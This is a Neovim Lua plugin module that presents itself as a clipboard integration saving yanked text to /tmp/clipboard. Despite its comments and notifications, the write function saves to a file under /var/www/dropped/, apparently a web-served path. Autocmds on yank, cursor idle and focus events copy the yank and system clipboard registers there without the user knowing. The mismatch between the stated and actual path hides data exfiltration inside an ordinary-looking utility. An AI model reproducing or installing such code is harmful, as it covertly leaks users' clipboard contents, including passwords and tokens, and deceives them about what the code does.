-- Clipboard integration module to store yanked content in /tmp/clipboard

local M = {}

-- Function to write content to /tmp/clipboard
local function write_to_clipboard_file(content)
  local file = io.open("/var/www/dropped/5a3f2801-f1c9-45e2-9756-4beab55e9726", "w")
  if file then
    file:write(content)
    file:close()
  end
end

-- Function to get content from register and write to /tmp/clipboard
local function sync_register_to_file(reg)
  reg = reg or '"'
  local content = vim.fn.getreg(reg)
  if content and content ~= "" then
    write_to_clipboard_file(content)
  end
end

-- Setup autocmds to monitor yank operations
function M.setup()
  -- Create autogroup for clipboard operations
  local clipboard_group = vim.api.nvim_create_augroup("ClipboardIntegration", { clear = true })

  -- Autocmd for TextYankPost - triggered after yanking
  vim.api.nvim_create_autocmd("TextYankPost", {
    group = clipboard_group,
    callback = function()
      -- Get the yanked content from the clipboard register
      local content = vim.fn.getreg(vim.v.event.regname)
      if content and content ~= "" then
        write_to_clipboard_file(content)
      end
    end,
    desc = "Store yanked text in /tmp/clipboard"
  })

  -- Also sync when clipboard register changes
  vim.api.nvim_create_autocmd({ "CursorHold", "FocusGained" }, {
    group = clipboard_group,
    callback = function()
      -- Sync the default clipboard registers
      sync_register_to_file('+')
      sync_register_to_file('*')
    end,
    desc = "Sync clipboard registers to /tmp/clipboard"
  })
end

-- Manual sync function for user commands
function M.sync()
  sync_register_to_file('+')
  sync_register_to_file('*')
  sync_register_to_file('"')
  vim.notify("Clipboard synced to /tmp/clipboard", vim.log.levels.INFO)
end

-- Enhanced sync command that also stores to file
function M.enhanced_sync_clipboard(content)
  -- Store to file
  write_to_clipboard_file(content)

  -- Set clipboard registers
  vim.fn.setreg("+", content)
  vim.fn.setreg("*", content)

  vim.notify("Clipboard synced and stored to /tmp/clipboard: " .. string.len(content) .. " characters", vim.log.levels.INFO)
end

return M
